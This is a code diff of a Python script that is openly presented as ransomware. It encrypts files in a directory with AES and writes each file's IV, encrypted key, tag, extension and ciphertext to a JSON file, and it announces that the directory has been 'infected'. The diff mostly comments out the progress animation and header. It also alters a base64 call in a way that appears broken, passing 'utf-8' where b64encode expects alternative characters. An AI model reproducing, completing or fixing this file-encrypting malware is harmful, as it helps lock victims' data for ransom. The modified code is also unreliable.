@@ -1,6 +1,6 @@
 from base64 import b64encode, b64decode
 from threading import Thread
-import encryption, constants, os, json, cryptools, time, sys, colorama
+import encryption, constants, os, json, cryptools, time, sys # colorama
 
 
 '''
@@ -20,11 +20,11 @@ def main():
 
 	global repeat
 
-	animation = Thread(target=cinematics)
+	#animation = Thread(target=cinematics)
 
-	printheader()
+	#printheader()
 
-	animation.start()
+	#animation.start()
 
 	folder_path = '..'
 
@@ -69,7 +69,7 @@ def main():
 			json_dict['IV'] = b64encode(aes_iv)
 			json_dict['KEY'] = b64encode(encrypted_keys)
 			json_dict['TAG'] = b64encode(tag)
-			json_dict['EXT'] = b64encode(ext)
+			json_dict['EXT'] = b64encode(ext, 'utf-8')
 			json_dict['CIPHER'] = b64encode(ciphertext)
 
 			with open(os.path.join(current_directory, fileName + '.json'), 'w') as json_file:
@@ -79,6 +79,8 @@ def main():
 
 	repeat = False
 
+'''
+Works for Python2
 def cinematics():
 	while repeat:
 		if progressbar:
@@ -94,13 +96,14 @@ def cinematics():
 	os.chdir('..')
 	sys.stdout.write('\b \n\n' + colorama.Style.RESET_ALL + 'Directory has been ' + colorama.Fore.RED + 'infected' + colorama.Style.RESET_ALL + '\n\n')
 	sys.stdout.write(colorama.Style.RESET_ALL)
-
+'''
+'''
 def printheader():
 	os.chdir('..')
 	sys.stdout.write('\nInfecting Directory: ' + colorama.Fore.GREEN + os.getcwd() + '...  ')
 	sys.stdout.flush()
 	sys.stdout.write(colorama.Style.RESET_ALL)
 	os.chdir('ransomware')
-
+'''
 if __name__ == '__main__':
 	main()
